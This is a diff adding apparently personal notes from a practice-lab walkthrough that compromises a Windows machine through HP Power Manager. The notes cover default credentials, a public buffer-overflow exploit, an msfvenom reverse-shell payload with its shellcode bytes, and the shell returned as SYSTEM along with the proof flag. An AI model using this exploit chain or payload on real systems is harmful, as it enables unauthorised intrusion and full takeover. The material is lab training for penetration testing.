@@ -1,0 +1,101 @@
+No credentials were provided for this machine
+
+nmap -vvv -T5 -Pn 192.168.192.45 -p- -A -oN nmap.txt
+
+sudo echo "192.168.192.45 kevin.offsec" | sudo tee -a /etc/hosts
+
+http://kevin.offsec
+
+http://kevin.offsec/index.asp
+
+https://www.google.com/search?q=hp+power+manager+default+creds&oq=hp+power+manager+default+creds&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQLhhA0gEINDAwMmowajGoAgiwAgE&sourceid=chrome&ie=UTF-8
+
+https://community.hpe.com/hpeb/plugins/custom/hp/hpebresponsive/custom.bounce_endpoint?referer=https%3A%2F%2Fcommunity.hpe.com%2Ft5%2Fservers-general%2Fhp-power-manager-password%2Ftd-p%2F3215442#:~:text=The%20default%20password%20for%20admin%20is%20%22admin%22.
+
+admin:admin
+
+HP Power Manager 4.2 (Build 7)
+
+https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/kevin]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of python file: 1722 bytes
+buf =  b""
+buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
+buf += b"\x81\x76\x0e\xd2\x99\x85\xbb\x83\xee\xfc\xe2\xf4"
+buf += b"\x2e\x71\x07\xbb\xd2\x99\xe5\x32\x37\xa8\x45\xdf"
+buf += b"\x59\xc9\xb5\x30\x80\x95\x0e\xe9\xc6\x12\xf7\x93"
+buf += b"\xdd\x2e\xcf\x9d\xe3\x66\x29\x87\xb3\xe5\x87\x97"
+buf += b"\xf2\x58\x4a\xb6\xd3\x5e\x67\x49\x80\xce\x0e\xe9"
+buf += b"\xc2\x12\xcf\x87\x59\xd5\x94\xc3\x31\xd1\x84\x6a"
+buf += b"\x83\x12\xdc\x9b\xd3\x4a\x0e\xf2\xca\x7a\xbf\xf2"
+buf += b"\x59\xad\x0e\xba\x04\xa8\x7a\x17\x13\x56\x88\xba"
+buf += b"\x15\xa1\x65\xce\x24\x9a\xf8\x43\xe9\xe4\xa1\xce"
+buf += b"\x36\xc1\x0e\xe3\xf6\x98\x56\xdd\x59\x95\xce\x30"
+buf += b"\x8a\x85\x84\x68\x59\x9d\x0e\xba\x02\x10\xc1\x9f"
+buf += b"\xf6\xc2\xde\xda\x8b\xc3\xd4\x44\x32\xc6\xda\xe1"
+buf += b"\x59\x8b\x6e\x36\x8f\xf1\xb6\x89\xd2\x99\xed\xcc"
+buf += b"\xa1\xab\xda\xef\xba\xd5\xf2\x9d\xd5\x66\x50\x03"
+buf += b"\x42\x98\x85\xbb\xfb\x5d\xd1\xeb\xba\xb0\x05\xd0"
+buf += b"\xd2\x66\x50\xeb\x82\xc9\xd5\xfb\x82\xd9\xd5\xd3"
+buf += b"\x38\x96\x5a\x5b\x2d\x4c\x12\xd1\xd7\xf1\x45\x13"
+buf += b"\xff\x33\xed\xb9\xd2\x98\x3e\x32\x34\xf3\x95\xed"
+buf += b"\x85\xf1\x1c\x1e\xa6\xf8\x7a\x6e\x57\x59\xf1\xb7"
+buf += b"\x2d\xd7\x8d\xce\x3e\xf1\x75\x0e\x70\xcf\x7a\x6e"
+buf += b"\xba\xfa\xe8\xdf\xd2\x10\x66\xec\x85\xce\xb4\x4d"
+buf += b"\xb8\x8b\xdc\xed\x30\x64\xe3\x7c\x96\xbd\xb9\xba"
+buf += b"\xd3\x14\xc1\x9f\xc2\x5f\x85\xff\x86\xc9\xd3\xed"
+buf += b"\x84\xdf\xd3\xf5\x84\xcf\xd6\xed\xba\xe0\x49\x84"
+buf += b"\x54\x66\x50\x32\x32\xd7\xd3\xfd\x2d\xa9\xed\xb3"
+buf += b"\x55\x84\xe5\x44\x07\x22\x65\xa6\xf8\x93\xed\x1d"
+buf += b"\x47\x24\x18\x44\x07\xa5\x83\xc7\xd8\x19\x7e\x5b"
+buf += b"\xa7\x9c\x3e\xfc\xc1\xeb\xea\xd1\xd2\xca\x7a\x6e"
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/kevin]
+└─$ python3 exploit.py -h                   
+Usage: python3 exploit.py <Remote IP Address> <Remote Port> <Local Listener Port>
+Example: python3 exploit.py 10.10.0.1 80 4411
+                                                                                                                                                                                                                                            
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/kevin]
+└─$ python3 exploit.py 192.168.192.45 80 443
+[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit
+[+] Sending exploit to Ip 192.168.192.45 on port 80. Starting local listener on port 443
+listening on [any] 443 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.45] 49168
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A451-A4B1
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/09/2020  07:24 PM    <DIR>          .
+07/09/2020  07:24 PM    <DIR>          ..
+10/23/2025  01:48 AM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   1,784,217,600 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+a47fc744dd6f0023115c32ff78779807
+
+C:\Users\Administrator\Desktop>
